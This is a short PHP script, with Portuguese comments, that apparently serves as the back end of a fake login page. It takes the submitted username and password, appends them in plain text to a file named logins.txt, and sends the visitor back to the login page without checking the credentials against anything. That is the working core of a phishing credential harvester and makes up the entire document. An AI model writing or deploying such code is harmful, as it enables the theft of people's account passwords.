<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obter dados do formulário
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Escrever os dados do login em um arquivo de texto
    $file = fopen("logins.txt", "a");
    fwrite($file, "Usuário: $username - Senha: $password\n");
    fclose($file);

    // Redirecionar de volta para a página de login
    header("Location: index.html");
    exit();
}
?>
